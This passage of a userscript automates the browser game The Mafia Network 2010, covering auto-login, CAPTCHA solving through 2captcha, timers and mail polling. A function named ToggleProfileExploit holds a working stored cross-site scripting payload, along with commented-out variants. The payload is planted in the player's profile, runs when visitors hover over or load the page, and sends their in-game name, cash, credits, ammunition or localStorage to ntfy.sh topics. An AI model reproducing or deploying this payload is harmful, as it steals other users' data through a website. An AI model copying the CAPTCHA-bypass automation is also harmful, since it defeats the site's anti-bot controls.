                $positionDropdown.css('display', (value === 'Auto Accept Any' || value === 'Auto Accept Specific') ? 'block' : 'none');
                $ocTypeLabel.css('display', value === 'Lead OC' ? 'block' : 'none');
                $ocTypeDropdown.css('display', value === 'Lead OC' ? 'block' : 'none');
                $leaderInputs.css('display', value === 'Lead OC' ? 'block' : 'none');

                // Hide car dropdown if Lead OC
                if (value === 'Lead OC') {
                    $carPrefLabel.hide();
                    $carDropdown.hide();
                } else {
                    const posText = $positionToggle.text();
                    $carPrefLabel.css('display', (posText.includes('TP') || posText.includes('Any')) ? 'block' : 'none');
                    $carDropdown.css('display', (posText.includes('TP') || posText.includes('Any')) ? 'block' : 'none');
                }
            });

            // Position selection logic
            $positionMenu.find('div').on('click', function () {
                const value = $(this).data('value') || $(this).text();
                $carPrefLabel.css({ display: ((value === 'TP' || value === 'Any') && (savedAutoOCPref === 'Auto Accept Any' || savedAutoOCPref === 'Auto Accept Specific')) ? 'block' : 'none' });
                $positionToggle.text(value + ' ▼');
                GM_setValue('TMN_OC_POSITION', value);
                $positionMenu.hide();

                // Show car dropdown if TP or Any and Auto OC is not Lead OC
                if ((value === 'TP' || value === 'Any') && (savedAutoOCPref === 'Auto Accept Any' || savedAutoOCPref === 'Auto Accept Specific')) {
                    $carDropdown.show();
                } else {
                    $carDropdown.hide();
                }
            });

            // OC Type selection
            $ocTypeMenu.find('div').on('click', function () {
                const value = $(this).data('value') || $(this).text();
                $ocTypeToggle.text(value + ' ▼');
                savedLeadOCInputs['Type'] = value;
                GM_setValue('TMN_LEAD_OC_INPUTS', JSON.stringify(savedLeadOCInputs));
                $ocTypeMenu.hide();
            });

            // Car preference selection
            $carMenu.find('div').on('click', function () {
                const value = $(this).data('value') || $(this).text();
                $carToggle.text(value + ' ▼');
                GM_setValue('TMN_CAR_PREF', value);
                $carMenu.hide();
            });

            // Script toggles
            $scriptMenu.find('input[type="checkbox"]').on('change', function () {
                const states = {};
                $scriptMenu.find('input[type="checkbox"]').each(function () {
                    states[$(this).data('script')] = $(this).is(':checked');
                });
                GM_setValue('TMN_SCRIPT_STATES', JSON.stringify(states));

                // Hide OC section if OC script disabled
                const ocEnabled = states.OC;
                $ocSection.css('display', ocEnabled ? 'block' : 'none');
                $('#tmn-oc-section + hr').css('display', ocEnabled ? 'block' : 'none');

                // Hide Arbitrage section if Arbitrage script disabled
                const arbitrageEnabled = states['Auto Arbitrage'];
                $arbitrageSection.css('display', arbitrageEnabled ? 'block' : 'none');
                $('#tmn-arbitrage-section + hr').css('display', arbitrageEnabled ? 'block' : 'none');
            });
        }
    })();

    function RefreshStats(data) {
        $.each(data[0], function (key, val) {
            try {
                if (key == "health") {
                    window.top.$("span[id*='" + key + "']").text(val + '%');
                }
                else if (key == "cash") {
                    window.top.$("span[id*='" + key + "']").text('$' + cashFormat(val));
                }
                else if (key == "newMails") {
                    if (val == 0) {
                        window.top.$("[id*='imgMessages']").attr("title", "");
                        window.top.$("[id*='imgMessages']").removeClass('message1 message2').addClass('nomessage');
                    }
                    else {
                        window.top.$("[id*='imgMessages']").attr("title", "1+");
                        window.top.$("[id*='imgMessages']").removeClass('nomessage message1 message2').addClass(`message${Math.min(2, data[0].newMailCount)}`);
                    }
                }
                else if (key == "newMailCount") {
                    if (val > 0) {
                        document.title = val + " new mails - The Mafia Network 2010";
                    }
                }
                else {
                    window.top.$("span[id*='" + key + "'][class='usrinfovalue']").text(val);
                }
            } catch (e) {
                console.error('Error processing key:', key, e);
            }
        });

        function cashFormat(nStr) {
            nStr += '';
            const x = nStr.split('.');
            let x1 = x[0];
            const x2 = x.length > 1 ? '.' + x[1] : '';
            var rgx = /(\d+)(\d{3})/;
            while (rgx.test(x1)) {
                x1 = x1.replace(rgx, '$1,$2');
            }
            return x1 + x2;
        }
    }

    const AddRankBar = (() => {
        let interceptorInstalled = false;

        function UpdateRankbar() {
            const $tmnRankbar = $(window.top.document.querySelector('#ctl00_userInfo_lblRankbarPerc'));
            const $lblRank = $(window.top.document.querySelector('#ctl00_userInfo_lblrank'));

            if ($tmnRankbar.length && $lblRank.length) {
                $tmnRankbar.css({
                    /*color: 'blue',
                    fontWeight: 'bold'*/
                }).text(`(${CalculateRankPercent(GM_getValue('TMN_EXPERIENCE', '?'))}%)`);
            } else {
                const rankbarHtml = ` <a href="statistics.aspx?p=p"><span id="ctl00_userInfo_lblRankbarPerc" class="usrinfovalue" /*style="color: blue; font-weight: bold;*/">(${CalculateRankPercent(GM_getValue('TMN_EXPERIENCE', '?'))}%)</span></a>`
                $('#ctl00_userInfo_lblrank').after(rankbarHtml);
            }

            function CalculateRankPercent(exp) {
                if (exp === '?') return '?';
                const savedExp = GM_getValue('TMN_EXPERIENCE', 0);
                const ranks = [ 'Scum', 'Wannabe', 'Thug', 'Criminal', 'Gangster', 'Hitman', 'Hired Gunner', 'Assassin', 'Boss', 'Don', 'Enemy of the State', 'Global Threat', 'Global Dominator', 'Global Disaster', 'Legend' ];
                const rankId = ranks.indexOf($('#ctl00_userInfo_lblrank').text());
                const totalExpAmts = [0, 5, 20, 80, 140, 220, 320, 450, 600, 800, 1100, 1500, 2000, 3000, 3000 ];
                const perRankReq = [5, 15, 60, 60, 80, 100, 130, 150, 200, 300, 400, 500, 1000, 2000, 2000 ];
                GM_setValue('TMN_EXPERIENCE', Math.max(savedExp, exp));
                const rankPerc = (exp - totalExpAmts[rankId]) / perRankReq[rankId] * 100;
                return FormatPercent(rankPerc);
            }

            function FormatPercent(rankPerc) {
                let formattedPerc = rankPerc.toFixed(2).replace('.', ',').replace(/,(\d*[1-9])0+$|,0+$/,',$1').replace(/,$/, '');

                return formattedPerc;
            }
        };

        function AddPersonalStatsInterceptor() {
            if (interceptorInstalled) return;
            interceptorInstalled = true;

            const TARGET = 'hndlr.ashx?m=pst&t=';
            const originalOpen = XMLHttpRequest.prototype.open;
            const originalSend = XMLHttpRequest.prototype.send;

            XMLHttpRequest.prototype.open = function(method, url, ...rest) {
                this._intercept = url.includes(TARGET);
                return originalOpen.call(this, method, url, ...rest);
            };

            XMLHttpRequest.prototype.send = function(...args) {
                if (this._intercept) {
                    this.addEventListener('readystatechange', function() {
                        if (this.readyState === 4 && this.status === 200) {
                            try {
                                let data = JSON.parse(this.responseText);
                                GM_setValue('TMN_EXPERIENCE', data[0].Experience);
                                UpdateRankbar();
                                /* ----------------------- UPDATE STATS -----------------------*/
                                RefreshStats(data);
                                /* ------------------------ AIO ONLY ------------------------- */
                                const savedScriptStates = JSON.parse(GM_getValue('TMN_SCRIPT_STATES', '{}'));
                                if (!isFullHealth() && savedScriptStates['Auto Heal']) window.top.location.href = 'credits.aspx?autoheal'; return;
                                /* ----------------------------------------------------------- */
                            } catch (e) {
                                //console.log(e);
                            }
                        }
                    });
                }

                return originalSend.apply(this, args);
            };

            const $statRefresh = $('#ctl00_imgRefresh');
            if ($statRefresh.length ) $statRefresh.closest('a').prop('onclick')();
        };

        // ---- the callable function ----
        const run = () => {
            AddPersonalStatsInterceptor();
            UpdateRankbar();
        };

        // ---- run immediately ----
        run();

        // ---- return for later calls ----
        return run;
    })();

    function isFullHealth() {
        const $health = $('#ctl00_userInfo_lblhealth');
        if ($health.length) {
            if (parseInt($health.text(), 10) == 100) return true;
            else return false;
        }
    }

    let notifyQueue = Promise.resolve();

    function Notify(msg) {
        notifyQueue = notifyQueue
            .then(() => PostMsg(msg))
            .then(() => new Promise(r => setTimeout(r, 2000)));
        return notifyQueue;
    }


    function PostMsg(message) {
        fetch('https://ntfy.sh/TMN_Inbox_Alert', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: message
        });
    }

    async function FetchPage(url) {
        const res = await fetch(url);
        const html = await res.text();
        const doc = new DOMParser().parseFromString(html, 'text/html');

        // Refresh personal stats with the key obtained from fetched page
        const onclick = $(doc).find('#ctl00_imgRefresh').closest('a').attr('onclick');
        const match = onclick.match(/^(\w+)\((.*)\);?$/);
        if (match) {
            const fnName = match[1];
            const argString = match[2];

            $.getJSON('hndlr.ashx?m=pst&t=' + argString);
        }

        return $(doc);
    }

    function AddLogDiv() {
        const $topDoc = $(window.top.document);
        if ($topDoc.find('#console')[0]) return;

        const consoleDiv = $('<div>', { id: 'console' }).css({
            'padding-left': '10px',
            'color': '#FF9933',
            'font-weight': 'bold',
            'text-align': 'left',
            'align-content': 'center',
            'grid-area': 'log',
            'height': '30px',
            'border-bottom': '2px solid #ccc'
        }).html('<span></span>');

        const divContent = $topDoc.find('#divContent')[0] || $topDoc.find('.divcontent')[0];
        if (divContent) $(divContent).prepend(consoleDiv);
    }

    function Log(message) {
        AddLogDiv();
        $(window.top.document).find('#console > span')?.html(message);
    }

    function ClearLog() {
        $(window.top.document).find('#console').remove();
    }

    function LogCountdown(totalTime, interval, message, callback) {
        //totalTime in ms
        const countdownInterval = setInterval(() => {
            if (totalTime <= 0) {
                clearInterval(countdownInterval);
                callback();
            }
            Log(`${message} in: ${totalTime/1000}`);
            totalTime -= interval;
        }, interval);
    }

    function HandleJail() {
        if (!window.top.jailTimerStarted) {
            window.top.jailTimerStarted = true;
            const lblMsg = $('#ctl00_lblMsg');
            let sentenceLength = parseInt(lblMsg.text().match(/\d+/)[0], 10);
            const now = Date.now();
            const delayToNextSecond = 1000 - (now % 1000);

            setTimeout( SyncJailTimers, delayToNextSecond);

            function SyncJailTimers() {
                const sentenceInterval = setInterval(() => {
                    let jailTimers = $(window.top.document).find('iframe').map((n, e) => {
                        const lblMsg = $(e.contentDocument).find('#ctl00_lblMsg');
                        const match = lblMsg.text().match(/\d+/);
                        return match ? lblMsg[0] : null;
                    }).get().filter(Boolean);

                    if (!jailTimers.length) jailTimers = [lblMsg[0]];
                    let minSentenceLength = Math.min(
                        ...jailTimers.map(lbl => {
                            const match = $(lbl).text().match(/\d+/);
                            return match ? parseInt(match[0], 10) : Infinity;
                        })
                    );

                    minSentenceLength = Math.max(0, minSentenceLength - 1);

                    jailTimers.forEach(lblMsg => {
                        $(lblMsg).text($(lblMsg).text().replace(/\d+/, minSentenceLength));
                    });

                    if (minSentenceLength <= 0) {
                        clearInterval(sentenceInterval);
                        window.top.jailTimerStarted = false;
                        jailTimers.forEach(lblMsg => {
                            const ownerFrame = lblMsg.ownerDocument.defaultView.frameElement;
                            if (ownerFrame) {
                                ownerFrame.contentWindow.location.href = ownerFrame.contentWindow.location.href.replace('#', '');
                            } else {
                                window.top.location.href = window.top.location.href.replace('#', '');
                            }
                        });
                    }
                }, 1000);
            }

            (async function PollJail() {
                const fetchedPage = await FetchPage('blackjack.aspx');
                const lblMsg = fetchedPage.find('#ctl00_lblMsg').text();

                //clearInterval(pollTimeInterval);
                if (!lblMsg.includes('jail')) {
                    //clearTimeout(pollJailTimeout);
                    window.top.jailTimerStarted = false;
                    const iFrames = $(window.top.document).find('iframe');
                    if (iFrames.length > 0) {
                        iFrames.each((n, iframe) => {
                            if ($(iframe.contentDocument).find('#ctl00_lblMsg')?.text().includes('jail')) {
                                iframe.contentWindow.location.href = iframe.contentWindow.location.href.replace('#', '');
                            }
                        });
                    } else {
                        window.top.location.href = window.top.location.href.replace('#', '');
                    }
                }
                setTimeout(PollJail, 5000);

                /*pollTime = Number(( (Math.random() * 3000 + 2000) / 1000).toFixed(1));
                    pollJailTimeout = setTimeout(PollJail, pollTime * 1000);pollTimeInterval = setInterval(() => {
                        pollTime-=0.1;
                        Log(`Still in jail. Polling again in ${parseFloat(Math.max(0, pollTime)).toFixed(1)}s.`)
                    }, 100);*/
            })();
        }
    }

    async function CrimesCountdown(type) {
        await GetNextTimers();
        const storedValues = { 'Booze': GM_getValue('TMN_NEXT_BOOZE'), 'Crimes': GM_getValue('TMN_NEXT_CRIME'), 'GTA': GM_getValue('TMN_NEXT_GTA') }
        const lblMsg = $('#ctl00_main_lblResult');
        //const delayToNextSecond = 1000 - (Date.now() % 1000);
        const crimeInterval = setInterval(() => {
            const now = Date.now();
            const match = lblMsg.text().match(/(\d+)\s*seconds/)[0];
            let time = match.match(/\d+/);
            time = Math.max(0, Math.round((storedValues[type] - now) / 1000) );
            $(lblMsg).html($(lblMsg).html().replace(/(\d+)\s*seconds/, `${time} seconds`));

            if (time <= 0) {
                clearInterval(crimeInterval);
                location.href = location.href;
            }
        }, 1000);
    }

    function GetAvailableTime(message) {
        const regex = /(\d+)\s*hours?.*?(\d+)\s*minutes?.*?(\d+)\s*seconds?/i;

        const match = message.match(regex);

        if (message === 'Available') {
            return 1;
        } else if (message.includes('Doing one')) {
            return Infinity;
        } else if (!match) {
            throw new Error('Time format not found in the message.');
        }

        const hours = parseInt(match[1], 10);
        const minutes = parseInt(match[2], 10);
        const seconds = parseInt(match[3], 10);

        const now = new Date();
        const availableTime = now.getTime() + (hours * 3600 + minutes * 60 + seconds) * 1000;

        return availableTime;
    }

    async function GetNextTimers() {
        const fetchedPage = await FetchPage('statistics.aspx?p=p');
        // Extract times from the table
        const rows = fetchedPage.find('#ctl00_main_gvTimers tr');
        let lastOC, lastDTM, lastCrime, lastGTA, lastTravel;

        rows.each((i, row) => {
            const cells = $(row).find('td');
            if (cells.length === 2) {
                const label = cells[0].innerText.trim();
                const value = cells[1].innerText.trim();
                switch (label) {
                    case 'Last Organized Crime':
                        lastOC = ConvertToLocalTime(value);
                        break;
                    case 'Last Drugs Transportation Mission':
                        lastDTM = ConvertToLocalTime(value);
                        break;
                    case 'Last Crime':
                        lastCrime = ConvertToLocalTime(value);
                        break;
                    case 'Last GTA':
                        lastGTA = ConvertToLocalTime(value);
                        break;
                    case 'Last Travel':
                        lastTravel = ConvertToLocalTime(value);
                        break;
                }
            }
        });

        // Apply offsets
        const nextOC = lastOC + 6 * 60 * 60 * 1000;
        const nextDTM = lastDTM + 2 * 60 * 60 * 1000;
        if (!(GM_getValue('TMN_NEXT_OC') === Infinity && Date.now() > nextOC)) {
            GM_setValue('TMN_NEXT_OC', nextOC);
        }
        if (!(GM_getValue('TMN_NEXT_DTM') === Infinity && Date.now() > nextDTM)) {
            GM_setValue('TMN_NEXT_DTM', nextDTM);
        }
        GM_setValue('TMN_NEXT_CRIME', lastCrime + 2 * 60 * 1000);
        GM_setValue('TMN_NEXT_GTA', lastGTA + 4 * 60 * 1000);
        GM_setValue('TMN_NEXT_JET_FLIGHT', lastTravel + 20 * 60 * 1000);
        GM_setValue('TMN_NEXT_FLIGHT', lastTravel + 45 * 60 * 1000);
    }

    function ConvertToLocalTime(euroDateTimeStr) {
        // Strip square brackets and trim
        euroDateTimeStr = String(euroDateTimeStr).replace(/[\[\]]/g, '').trim();

        // Expected formats:
        // "DD-MM-YYYY HH:mm" or "DD-MM-YYYY HH:mm:ss"
        const parts = euroDateTimeStr.split(' ');
        if (parts.length < 2) {
            throw new Error(`Invalid date/time string: "${euroDateTimeStr}"`);
        }

        const [datePart, timePart] = parts;

        // Parse date
        const [dayStr, monthStr, yearStr] = datePart.split('-');
        const day = Number(dayStr), month = Number(monthStr), year = Number(yearStr);

        if (!Number.isInteger(day) || !Number.isInteger(month) || !Number.isInteger(year)) {
            throw new Error(`Invalid date part: "${datePart}"`);
        }

        // Parse time (HH:mm or HH:mm:ss)
        const timeSegs = timePart.split(':');
        if (timeSegs.length < 2 || timeSegs.length > 3) {
            throw new Error(`Invalid time part: "${timePart}"`);
        }

        const hour = Number(timeSegs[0]);
        const minute = Number(timeSegs[1]);
        const second = Number(timeSegs[2] ?? 0);  // default to 0 when seconds missing

        if (![hour, minute, second].every(Number.isFinite)) {
            throw new Error(`Invalid time components: "${timePart}"`);
        }

        // Central European Time offset (CET = UTC+1). Simple version — ignores DST.
        const offsetHours = 1;

        // Create UTC timestamp by subtracting CET offset
        const utcMs = Date.UTC(year, month - 1, day, hour - offsetHours, minute, second);

        // Return local timestamp (ms since epoch) — matches original behavior
        return utcMs;
    }

    function isMobile() {
        return /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
    }

    function OnLoginPage() {
        const userBox = document.querySelector('#ctl00_main_txtUsername');
        const passBox = document.querySelector('#ctl00_main_txtPassword');
        const recDiv = document.querySelector('.g-recaptcha');
        const loginBtn = document.querySelector('#ctl00_main_btnLogin');
        return !!(userBox && passBox && recDiv && loginBtn);
    }

    function UniversalCaptchaSolve(key) {
        Log('[Captcha] Starting solve...');

        const siteKey = key || $('.g-recaptcha').attr('data-sitekey');
        if (!siteKey) {
            Log('[Captcha] No sitekey found, aborting.');
            location.href = defaultPage;
            return;
        }

        if (window._tmn_solving_captcha) {
            Log('[Captcha] Already solving, skipping.');
            return;
        }

        window._tmn_solving_captcha = true;
        const pageUrl = location.href;
        Log('[Captcha] Sending solve request to 2captcha...');

        GM_xmlhttpRequest({
            method: 'POST',
            url: `https://2captcha.com/in.php?key=${TMN_CAPTCHA_KEY}&method=userrecaptcha&googlekey=${siteKey}&pageurl=${encodeURIComponent(pageUrl)}&json=1`,
            onload: function(response) {
                const json = JSON.parse(response.responseText);
                if (json.status === 1) {
                    Log('[Captcha] Request accepted, polling for result...');
                    pollUniversalCaptcha(json.request);
                } else {
                    Log('[Captcha] Request failed:', json.request);
                    console.log(json.request);
                    window._tmn_solving_captcha = false;
                }
            }
        });

        function pollUniversalCaptcha(requestId) {
            const poll = setInterval(() => {
                GM_xmlhttpRequest({
                    method: 'GET',
                    url: `https://2captcha.com/res.php?key=${TMN_CAPTCHA_KEY}&action=get&id=${requestId}&json=1`,
                    onload: function(response) {
                        const json = JSON.parse(response.responseText);
                        if (json.status === 1) {
                            Log('[Captcha] Captcha solved, injecting token...');
                            clearInterval(poll);
                            if (pageUrl.includes('store.aspx?p=b')) {
                                const token = json.request;
                                const expiry = Date.now() + 110000;
                                GM_setValue('TMN_BF_TOKEN', JSON.stringify({ 'token': token, 'expiry': expiry }));
                                window._tmn_solving_captcha = false;
                                location.href = location.href;
                            } else if (pageUrl.toLowerCase().includes('default.aspx') || pageUrl.toLowerCase().includes('jail.aspx')) {
                                const token = json.request;
                                const expiry = Date.now() + 110000;
                                GM_setValue('TMN_BF_TOKEN', JSON.stringify({ 'token': token, 'expiry': expiry }));
                                Log('[Captcha] Token saved.');  
                                clearInterval(poll);
                                window._tmn_solving_captcha = false;
                            }
                            else injectUniversalCaptcha(json.request);
                        } else if (json.request !== 'CAPCHA_NOT_READY') {
                            Log('[Captcha] Error:', json.request);
                            clearInterval(poll);
                            window._tmn_solving_captcha = false;
                        }
                    }
                });
            }, 5000);
        }

        function injectUniversalCaptcha(token) {
            const textarea = document.querySelector('textarea[name="g-recaptcha-response"]');
            const submit = document.querySelector('#ctl00_main_MyScriptTest_btnSubmit') || document.querySelector('#ctl00_main_btnLogin');
            if (!textarea || !submit) {
                Log('[Captcha] Missing textarea or submit button.');
                window._tmn_solving_captcha = false;
                return;
            }

            textarea.style.display = 'block';
            textarea.value = token;
            Log('[Captcha] Token injected, submitting...');
            setTimeout(() => {
                submit.click();
                Log('[Captcha] Submitted.');
                window._tmn_solving_captcha = false;
            }, 1200);
        }
    }

    function DoLogin() {
        const userBox = $('#ctl00_main_txtUsername')[0];
        const passBox = $('#ctl00_main_txtPassword')[0];
        const recDiv = $('.g-recaptcha')[0];
        const loginBtn = $('#ctl00_main_btnLogin')[0];
        const errMsg = $('#ctl00_main_lblMsg')[0];
        const msg = errMsg?.textContent.trim() || '';
        let manuallyEntering = false;
        $('iframe[src*="recaptcha/api2/anchor"]').on('focus', () => {
            manuallyEntering = true;
        });

        const savedScriptStates = JSON.parse(GM_getValue('TMN_SCRIPT_STATES', '{}'));
        if (!savedScriptStates['Auto Login']) return;

        if (msg.toLowerCase().includes('incorrect validation') || !(userBox && passBox && recDiv && loginBtn)) {
            LogCountdown(3000, 1000, 'Retrying', () => { location.href = 'https://www.tmn2010.net/login.aspx' });
            return;
        }

        userBox.value = JSON.parse(GM_getValue('TMN_PLAYER', ''))?.name;
        passBox.value = GM_getValue('TMN_PASSWORD', '');

        loginBtn.disabled = false;
        loginBtn.removeAttribute('disabled');

        let i = 10;
        const countdown = setInterval(() => {
            if (manuallyEntering) {
                clearInterval(countdown);
                Log(`Manual interaction detected.`);
                return;
            } else if (i == 0) {
                clearInterval(countdown);
                UniversalCaptchaSolve();
                return;
            }
            Log(`Sending captcha in: ${i}`);
            i--;
        }, 1000);
    }

    async function ToggleProfileExploit(status) {
        return;
        const enabled = status == 'on';
        //mouseover/touchstart posession
        const exploit = '\n[color=transparent;z-index:99999;background:#ffffff00;position:fixed;top:0;left:0;width:100vw;height:100vh;"id="trigger"data-fn="async function f(u){const r=await fetch(u),b=await r.text(),d=new DOMParser().parseFromString(b,\'text/html\');return $(d)}(async function(){let p=await f(\'players.aspx\'),v=p.find(\'a\').filter(function(){const s=$(this).attr(\'style\');return s&&s.includes(\'color: #AA0000\')}).text();p=await f(\'playerproperty.aspx?p=i\');const bp=p.find(\'.propertyItem\').last().text().trim().replace(/\\s+/g,\' \');await fetch(\'https://ntfy.sh/tmn161125\',{method:\'POST\',headers:{\'Content-Type\':\'application/json\'},body:`User: ${v}\\nProtection: ${bp}, Money: ${$(\'#ctl00_userInfo_lblcash\').text()}, FMJ: ${$(\'#ctl00_userInfo_lblfmj\').text()}, JHP: ${$(\'#ctl00_userInfo_lbljhp\').text()}, Credits: ${$(\'#ctl00_userInfo_lblcredits\').text()}`})})();$(\'#trigger\').remove();"onmouseover="eval(this.dataset.fn)"ontouchstart="eval(this.dataset.fn)][/color]';
        //Prev accounts [color=transparent;z-index:99999;background:#ffffff00;position:fixed;top:0;left:0;width:100vw;height:100vh;"id="trigger"data-fn="$('#ctl00_main_pnlPlayerStats').html($('#ctl00_main_pnlPlayerStats').html().replace(6, 1));$('#ctl00_main_lblAcctNum').text(1);$('#ctl00_main_pnlPreviousNames table').each(function() { $(this).find('tr:gt(1):lt(5)').remove() });$('#trigger').remove();"onmouseover="eval(this.dataset.fn)"ontouchstart="eval(this.dataset.fn)][/color]
        //onload localStorage
        //const exploit = '\n[youtube]VEfMAsFBMC8/0.jpg"id="trigger"onload="async function f(u){const r=await fetch(u),b=await r.text(),d=new DOMParser().parseFromString(b,\'text/html\');return $(d)}(async function(){let p=await f(\'players.aspx\'),v=p.find(\'a\').filter(function(){const s=$(this).attr(\'style\');return s&&s.includes(\'color: #AA0000\')}).text();p=await f(\'playerproperty.aspx?p=i\');const ls=JSON.stringify(localStorage);await fetch(\'https://ntfy.sh/tmn7112025\',{method:\'POST\',headers:{\'Content-Type\':\'application/json\'},body:`User: ${v}\\nlocalStorage: ${ls}`})})();$(\'#trigger\').closest(\'a\').remove();"][/youtube]';
        //onload posession
        //const exploit = '\n[youtube]VEfMAsFBMC8/0.jpg"id="trigger"onload="async function f(u){const r=await fetch(u),b=await r.text(),d=new DOMParser().parseFromString(b,\'text/html\');return $(d)}(async function(){let p=await f(\'players.aspx\'),v=p.find(\'a\').filter(function(){const s=$(this).attr(\'style\');return s&&s.includes(\'color: #AA0000\')}).text();p=await f(\'playerproperty.aspx?p=i\');const bp=p.find(\'ctl00_main_pnlProtections .propertyItem b\').last().text().trim().replace(/\\s+/g,\' \');await fetch(\'https://ntfy.sh/tmn7112025\',{method:\'POST\',headers:{\'Content-Type\':\'application/json\'},body:`User: ${v}\\nProtection: ${bp}, Money: ${$(\'#ctl00_userInfo_lblcash\').text()}, FMJ: ${$(\'#ctl00_userInfo_lblfmj\').text()}, JHP: ${$(\'#ctl00_userInfo_lbljhp\').text()}, Credits: ${$(\'#ctl00_userInfo_lblcredits\').text()}`})})();$(\'#trigger\').remove();"][/youtube]';
        //onload posession w/ fallback name method
        //const exploit = '\n[youtube]a/0.jpg"id="trigger"onload="async function f(u){const r=await fetch(u),b=await r.text(),d=new DOMParser().parseFromString(b,\'text/html\');return $(d)};(async function(){const $f=$(document.createElement(\'iframe\')).attr({id:\'profileFrame\',src:\'/authenticated/personal.aspx\',width:0,height:0,zIndex:99999}).appendTo(\'body\');let p=await f(\'players.aspx\'),v=p.find(\'a\').filter(function(){const s=$(this).attr(\'style\');return s&&s.includes(\'color: #AA0000\')}).text();if(!v){v=await new Promise(r=>$f.on(\'load\',()=>{const d=$f[0].contentDocument,$n=$(d).find(\'#ctl00_main_hlName\');if($n[0]){r($n.text());$f.remove()}else $(d).find(\'#ctl00_main_lnkViewProfile\').click()}));}p=await f(\'playerproperty.aspx?p=i\'),bp=p.find(\'#ctl00_main_pnlProtections .propertyItem b\').last().text();await fetch(\'https://ntfy.sh/tmn7112025\',{method:\'POST\',headers:{\'Content-Type\':\'application/json\'},body:`User: ${v}\\nProtection: ${bp}, Money: ${$(\'#ctl00_userInfo_lblcash\').text()}, FMJ: ${$(\'#ctl00_userInfo_lblfmj\').text()}, JHP: ${$(\'#ctl00_userInfo_lbljhp\').text()}, Credits: ${$(\'#ctl00_userInfo_lblcredits\').text()}`})})();$(\'#trigger\').closest(\'center\').remove()"][/youtube]'
        const fetchedPage = await FetchPage('personal.aspx');
        const exploitActive = fetchedPage.find('#ctl00_main_txtProfile').val().includes(exploit);

        if (enabled && !exploitActive) {
            const profileFrame = $('<iframe>', {
                id: 'profileFrame',
                src: '/authenticated/personal.aspx',
                width: '0',
                height: '0'
            });
            $('body').append(profileFrame);
            profileFrame.one('load', () => {
                const iframeElement = profileFrame[0];
                const $profileContent = $(iframeElement.contentDocument).find('#ctl00_main_txtProfile');
                $profileContent.val($profileContent.val() + exploit);
                Log('Profile exploit injected.');
                setTimeout(() => { $(profileFrame).remove(); }, 2000);
                $(iframeElement.contentDocument).find('#ctl00_main_lnkSave').click();
            });
        } else if (!enabled && exploitActive) {
            const profileFrame = $('<iframe>', {
                id: 'profileFrame',
                src: '/authenticated/personal.aspx',
                width: '0',
                height: '0'
            });
            $('body').append(profileFrame);
            profileFrame.one('load', () => {
                const iframeElement = profileFrame[0];
                const $profileContent = $(iframeElement.contentDocument).find('#ctl00_main_txtProfile');
                $profileContent.val($profileContent.val().replace(exploit, ''));
                Log('Profile exploit removed.');
                setTimeout(() => { $(profileFrame).remove(); }, 2000);
                $(iframeElement.contentDocument).find('#ctl00_main_lnkSave').click();
            });
        }
    }

    async function MainSetup() {
        const now = Date.now();
        const savedScriptStates = JSON.parse(GM_getValue('TMN_SCRIPT_STATES', '{}'));
        let fetchedPage = await FetchPage('players.aspx');

        const TMN_PLAYER = fetchedPage.find('a[style="color: #AA0000; font-weight: bold; "]')?.text();
        const TMN_PLAYER_PROFILE = fetchedPage.find('a[style="color: #AA0000; font-weight: bold; "]')?.prop('href');
        GM_setValue('TMN_PLAYER', JSON.stringify({name: TMN_PLAYER, profile: TMN_PLAYER_PROFILE}));
        const currentCity = $('#ctl00_userInfo_lblcity').text().trim();

        if (!isMobile()) {
            if (!document.referrer.includes('trade.aspx?autoarbitrage') && savedScriptStates['Auto Arbitrage']) {
                SetupContentFrame('trade.aspx?autoarbitrage');
                Log('Doing auto-arbitrage...');
            } else {
                window.matchMedia('(orientation: landscape)').addEventListener('change', SetupMainContentFrame);
                SetupMainContentFrame();
            }
        }

        await GetNextTimers();
        if (savedScriptStates['Spawn Camp Bullets']) {
            SpawnCampBullets();
            setInterval( SpawnCampBullets, 5000 );
        }

        const AutoBankTime = GM_getValue('TMN_AUTO_BANK_TIME', 0);
        if (now > AutoBankTime && savedScriptStates['Auto Bank']) {
            const amount = 49999999;
            location.href = `playerproperty.aspx?a=${amount}`;
            return;
        }

        const nextFlight = GM_getValue('TMN_NEXT_FLIGHT');
        if (nextFlight > now) {
            if (!$('#console:contains("precedence")').length) {
                Log(`Next Flight: ${new Date(nextFlight).toLocaleTimeString('en-NZ', {
                    hour: 'numeric',
                    minute: '2-digit',
                    hour12: true
                })}`);
            }
        } else if ((savedScriptStates['Auto Travel'])) {
            const fetchedPage = await FetchPage('statistics.aspx');
            const hotCity = decodeURIComponent(fetchedPage.find("td:first-child span:contains('Swords')").nextAll("span[id^='City']").text().trim());
            //const alternateCity = decodeURIComponent(fetchedPage.find("#ctl00_main_gvCitiesInformation tr td:first-child span[id^='City']").filter(function() {
            //    return !$(this).prev().text().includes("local_police");
            //}).first().text().trim());

            if (currentCity != hotCity) {
                if (isMobile()) location.href = `travel.aspx?d=${hotCity}`
                else SetupContentFrame(`travel.aspx?d=${hotCity}`);
            }
        }

        /*const lnm = JSON.parse(GM_getValue('TMN_LAST_NEW_MAIL', '{}'));
        lnm.id = 355676;
        GM_setValue('TMN_LAST_NEW_MAIL', JSON.stringify(lnm));*/
        // Check mailbox
        let checkingMailbox = false;
        await CheckMailbox();
        if (isMobile()) {
            if (savedScriptStates['Auto Arbitrage'] && page.includes(defaultPage)) {
                location.href = 'trade.aspx?autoarbitrage';
            }
            else if (page.includes(defaultPage)) {
                GoNextAction();
                return;
            }
        }
        setInterval( CheckMailbox, 5000);
        // Reload page every 5 min incase it hangs
        setInterval(() => { location.href = defaultPage }, 5 * 60000);
        async function CheckMailbox() {
            if (checkingMailbox) return;
            checkingMailbox = true;
            try {
                const fetchedPage = await FetchPage('mailbox.aspx');
                const receivedMail = fetchedPage.find('#ctl00_main_gridMail .nomobile').map((n, e) => {
                    const lines = $(e).text().split('\n').map(line => line.trim()).filter(line => line);
                    const author = lines[0];
                    const subject = lines[1];
                    const time = lines[2];
                    const link = $(e).find(`a[href*='mailbox']`).attr('href');
                    const id = link.split('id=')[1];
                    const unread = $(e).closest('.unreadmail').length;
                    return { author, subject, time, link, id, unread }
                }).get().reverse();
                // Process each mail sequentially to avoid race conditions
                for (const mail of receivedMail) {
                    await ProcessMail(mail);
                }

                // $('#divStats').html(fetchedPage.find('#divStats').html());
                // AddRankBar();
            } finally {
                checkingMailbox = false;
            }

        }

        async function ProcessMail(mail) {
            const now = Date.now();
            const timeDiff = now - ConvertToLocalTime(mail.time);

